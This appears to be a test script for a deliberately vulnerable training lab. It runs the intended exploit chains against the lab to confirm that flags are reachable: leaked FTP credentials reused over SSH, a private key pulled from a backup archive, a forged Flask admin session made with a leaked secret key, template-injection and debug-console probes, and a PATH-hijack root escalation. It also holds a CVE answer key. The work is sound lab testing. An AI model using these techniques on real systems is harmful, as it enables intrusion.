"""Proof-of-exploit checks for the challenges nothing else covered.

tools/verify_all.py proves most flags are reachable and that the scoreboard
accepts them.  Two things it cannot prove on its own:

  1. the CVE Hunting answers are the *historically correct* identifiers,
     rather than whatever string happens to sit in flags.json, and
  2. a flag is actually handed to a student by the running lab.

This tool runs the real exploit for the challenges whose delivery path was
missing or unverified, and fails loudly if one regresses.

    python tools/verify_challenges.py
"""
import io
import json
import os
import sys
import time
import urllib.error
import urllib.request
import zipfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import config  # noqa: E402

PASS, FAIL = [], []


def check(name, cond, detail=""):
    (PASS if cond else FAIL).append(name)
    if not cond or detail:
        print("  {} {:<34} {}".format("PASS" if cond else "FAIL", name, detail))
    return cond


def get(path, port=None, headers=None):
    url = "http://{}:{}{}".format(config.CONNECT_HOST, port or config.PORT_WEB, path)
    req = urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as exc:  # noqa: BLE001
        return 0, str(exc)


def jget(path, port=None, headers=None):
    st, body = get(path, port, headers)
    try:
        return st, json.loads(body)
    except ValueError:
        return st, {}


# ---------------------------------------------------------------------------
# 1. CVE Hunting: the accepted answers must be the real identifiers
# ---------------------------------------------------------------------------
# Each entry is the historically correct answer, cross-checked against the
# vendor/NVD record.  A challenge may accept several (flags.json supports a
# list); what must never happen is an answer that is not in this table.
CVE_IDS = ("cve-01", "cve-02", "cve-03", "cve-04", "cve-05",
           "cve-06", "cve-07", "cve-08", "cve-09", "cve-10")

CVE_ANSWERS = {    "cve-01": {"CVE-2011-2523"},          # vsftpd 2.3.4 backdoor
    "cve-02": {"CVE-2015-3306",           # ProFTPD mod_copy CPFR/CPTO
               "CVE-2019-12815"},         # ...and the later access-control one
    "cve-03": {"CVE-2017-0144"},          # EternalBlue / MS17-010
    "cve-04": {"CVE-2020-0796"},          # SMBGhost
    "cve-05": {"CVE-2024-6387"},          # regreSSHion
    "cve-06": {"CVE-2023-34285"},         # NETGEAR RAX30 cmsCli_authenticate
    "cve-07": {"CVE-2019-7713"},          # Interpeak IPCOMShell heap overflow
    "cve-08": {"CVE-2025-45042"},         # Tenda AC9 telnet command injection
    "cve-09": {"CWE-502"},                # untrusted deserialization
    "cve-10": {"CWE-290"},                # spoofed authentication
}

# The service fingerprint a student matches the answer against.  If the lab
# stops serving these, the research question stops being answerable.
CVE_FINGERPRINTS = [
    ("cve-01", "ftp", 2121, b"2.3.4"),
]


def check_cves():
    print()
    print("=" * 72)
    print(" CVE Hunting answers are historically correct")
    print("=" * 72)
    for cid in CVE_IDS:
        expected = CVE_ANSWERS[cid]
        accepted = set(config.flag_answers(cid))
        check("{} answer".format(cid), accepted and accepted <= expected,
              "accepted={}".format(sorted(accepted) or "NONE"))

    # vsftpd 2.3.4 has to be visible on the wire for cve-01 to be answerable
    import socket
    try:
        s = socket.create_connection((config.CONNECT_HOST, config.PORT_FTP), timeout=8)
        banner = s.recv(1024)
        s.close()
    except OSError as exc:
        banner = str(exc).encode()
    for cid, _name, _port, needle in CVE_FINGERPRINTS:
        check(cid + " fingerprint", needle in banner,
              "FTP banner must advertise {}".format(needle.decode()))


# ---------------------------------------------------------------------------
# 2. SSH credential-reuse chains, driven the way a student drives them
# ---------------------------------------------------------------------------
def ssh_login(user, password=None, key_pem=None):
    import paramiko
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        kw = dict(hostname=config.CONNECT_HOST, port=config.PORT_SSH, username=user,
                  look_for_keys=False, allow_agent=False, timeout=15)
        if key_pem:
            kw["pkey"] = paramiko.RSAKey.from_private_key(io.StringIO(key_pem))
        else:
            kw["password"] = password
        client.connect(**kw)
        chan = client.invoke_shell()
        chan.settimeout(4)
        buf, deadline = b"", time.time() + 6
        while time.time() < deadline:
            try:
                chunk = chan.recv(4096)
            except Exception:  # noqa: BLE001 - idle read, just stop
                break
            if not chunk:
                break
            buf += chunk
        return buf.decode("utf-8", "replace")
    except paramiko.AuthenticationException:
        return "AUTH REJECTED"
    except Exception as exc:  # noqa: BLE001
        return "ERROR {}: {}".format(type(exc).__name__, exc)
    finally:
        try:
            client.close()
        except Exception:  # noqa: BLE001
            pass


def check_credential_chains():
    print()
    print("=" * 72)
    print(" credential reuse: leak it somewhere, use it somewhere else")
    print("=" * 72)

    # ftp-03: anonymous FTP -> credentials.old -> SSH as svc_web.
    # The lab FTP has no PASV/EPSV, so reuse the raw-socket client.
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    import check_services
    pw = None
    try:
        raw = check_services.ftp_retr("/credentials.old").decode(
            "utf-8", "replace")
        for line in raw.splitlines():
            if line.startswith("svc_web:"):
                pw = line.split(":", 1)[1].strip()
    except Exception as exc:  # noqa: BLE001
        print("  (ftp fetch failed: {})".format(exc))
    check("ftp-03 password from FTP", bool(pw), pw or "not found")
    out = ssh_login("svc_web", pw) if pw else ""
    check("ftp-03 flag on svc_web login",
          config.resolve_flag("ftp-03") in out, out[:60])

    # ssh-02: SMB backup share -> svc_backup -> SSH
    out = ssh_login("svc_backup", "BackupSmb1!")
    check("ssh-02 flag on svc_backup login",
          config.resolve_flag("ssh-02") in out, out[:60])

    # ssh-03: the key inside backup.zip -> backup account
    pem = ""
    try:
        with zipfile.ZipFile(os.path.join(config.BACKUP_DIR, "backup.zip")) as zf:
            pem = zf.read("id_rsa").decode()
    except Exception as exc:  # noqa: BLE001
        print("  (backup.zip unreadable: {})".format(exc))
    # The archive, the on-disk key and the SSH service must all agree.  A
    # restart race once left backup.zip holding a different key than the
    # service, which silently made ssh-03 unsolvable.
    try:
        import services.ssh_service as sshs
        check("ssh-03 key consistent across archive and service",
              pem.strip() == sshs.load_private_key().strip()
              and pem.strip() == config.lab_private_key().strip())
    except Exception as exc:  # noqa: BLE001
        check("ssh-03 key consistent across archive and service", False, str(exc))
    out = ssh_login("backup", key_pem=pem) if pem else ""
    check("ssh-03 flag on key auth",
          config.resolve_flag("ssh-03") in out, out[:60])

    # and the key check has to actually mean something
    import paramiko
    rejected = ssh_login("backup", key_pem=(
        lambda k: (lambda b: (k.write_private_key(b), b.getvalue())[1])(
            io.StringIO()))(paramiko.RSAKey.generate(2048)))
    check("ssh-03 wrong key refused", "AUTH REJECTED" in rejected, rejected[:40])

    # linux-01: enumeration inside the simulated host
    shell = _offline_shell()
    if shell is not None:
        text = shell.run("cat /opt/vulnlab/README.local")
        check("linux-01 enumeration flag",
              config.resolve_flag("linux-01") in text)

    # linux-05: a root cron task resolves a bare command name through PATH,
    # and the directory it resolves from is writable.
    ns = _offline_namespace()
    SimShell = ns["SimShell"]
    hij = SimShell("svc_flask")
    before = hij.run("cat /root/root.txt")
    hij.run("chmod +w /opt/vulnlab/bin/log-cleaner")
    ns["VFS"].files["/opt/vulnlab/bin/log-cleaner"] = "#!/bin/sh\nid\n"
    after = hij.run("sudo /usr/bin/env lab-tick")
    check("linux-05 PATH hijack escalates",
          config.resolve_flag("linux-05") in after
          or "root" in after.lower(), after.splitlines()[-1:] and "")
    check("linux-05 not exploitable before the plant",
          "Permission denied" in before or config.resolve_flag("boot-02") not in before)


def _offline_shell():
    """The simulated host's shell, without opening a socket."""
    return _offline_namespace()["SimShell"]("student")


def _offline_namespace():
    src = os.path.join(config.BASE_DIR, "services", "ssh_service.py")
    ns = {"__name__": "ssh_sim_offline", "__file__": src}
    with open(src, "r", encoding="utf-8") as fh:
        exec(compile(fh.read(), src, "exec"), ns)
    return ns


# ---------------------------------------------------------------------------
# 3. Flask RCE module: forged session, stale cache, and the boss door tally
# ---------------------------------------------------------------------------
def check_flask_rce():
    print()
    print("=" * 72)
    print(" Flask RCE expansion")
    print("=" * 72)

    # flask-08: mint an admin session with the leaked SECRET_KEY
    import app as application
    from flask.sessions import SecureCookieSessionInterface
    signer = SecureCookieSessionInterface().get_signing_serializer(application.app)
    cookie = signer.dumps({"user": "admin", "role": "admin", "_fresh": True})
    _st, body = get("/admin", headers={"Cookie": "session=" + cookie})
    check("flask-08 forged session flag",
          config.resolve_flag("flask-08") in body)

    # bonus-08: the stale pre-warmed cache entry
    _st, data = jget("/api/v1/cache/get?key=demo")
    check("bonus-08 stale cache flag",
          data.get("value", {}).get("stale_flag") == config.resolve_flag("bonus-08"))

    # flask-boss: two of three doors must disclose the boss flag.  Start from a
    # clean tally so the check is deterministic across runs.
    import shutil
    shutil.rmtree(config.DOORS_DIR, ignore_errors=True)
    _st, tally = jget("/flask-boss")
    check("flask-boss endpoint present", "doors" in tally, str(tally)[:60])
    check("flask-boss closed below 2 doors", not tally.get("lab_flag"),
          "doors_open={}".format(tally.get("doors_open")))

    get("/profile?name=%7B%7B7*7%7D%7D")                       # SSTI door
    pin = config.compute_debug_pin()
    get("/debug-lab/console?pin={}&code=2%2B2".format(pin),
        config.PORT_DEBUG)                                     # debugger door
    _st, tally = jget("/flask-boss")
    check("flask-boss two doors open", tally.get("doors_open") == 2,
          "doors={}".format(tally.get("doors")))
    check("flask-boss flag disclosed",
          tally.get("lab_flag") == config.resolve_flag("flask-boss"))

    # the scoreboard gate: boss needs two doors solved as challenges too
    from scoreboard import _prereq_ok
    ok, why = _prereq_ok("flask-boss", {"flask-02", "flask-06"})
    check("flask-boss prereq (2 of 3)", ok, why)
    ok, _why = _prereq_ok("flask-boss", {"flask-02"})
    check("flask-boss prereq rejects 1 of 3", not ok)

    # Leave no residue: the doors we opened belong to the run, not the cohort.
    shutil.rmtree(config.DOORS_DIR, ignore_errors=True)
    _st, tally = jget("/flask-boss")
    check("door tally reset after the run", tally.get("doors_open") == 0,
          "doors_open={}".format(tally.get("doors_open")))


# ---------------------------------------------------------------------------
# 4. Gate: no challenge may ship without a way to obtain its flag
# ---------------------------------------------------------------------------
def check_every_flag_has_a_home():
    """No challenge may ship without a proof somewhere in the test suite.

    Scans the assertions in all three verification tools and requires the union
    to cover the whole catalog.  This is the property that actually matters:
    every challenge is exercised, by whichever tool owns it.
    """
    print()
    print("=" * 72)
    print(" every challenge is covered by a check")
    print("=" * 72)
    import re
    covered = set()
    here = os.path.dirname(os.path.abspath(__file__))
    for name in ("verify_all.py", "check_services.py", "check_simshell.py",
                 "verify_challenges.py"):
        with open(os.path.join(here, name), "r", encoding="utf-8") as fh:
            covered |= set(re.findall(r'check\(\s*"([a-z]+-[0-9a-z]+)',
                                      fh.read()))
    covered |= set(CVE_IDS)
    with open(os.path.join(config.BASE_DIR, "hints", "challenges.json"),
              "r", encoding="utf-8") as fh:
        catalog = json.load(fh)
    catalog = catalog["challenges"] if isinstance(catalog, dict) else catalog
    ids = [c["id"] for c in catalog]
    orphans = [i for i in ids if i not in covered]
    check("every challenge covered", not orphans, ", ".join(orphans))
    missing_flags = [i for i in ids if not config.flag_answers(i)]
    check("every challenge has a flag", not missing_flags,
          ", ".join(missing_flags) or "{} challenges".format(len(ids)))


def main():
    print("=" * 72)
    print(" VulnLab challenge proof  (delivery paths + CVE answers)")
    print("=" * 72)
    check_cves()
    check_credential_chains()
    check_flask_rce()
    check_every_flag_has_a_home()
    print()
    print("=" * 72)
    print(" {} passed, {} failed".format(len(PASS), len(FAIL)))
    if FAIL:
        print(" failing: {}".format(", ".join(FAIL)))
    print("=" * 72)
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
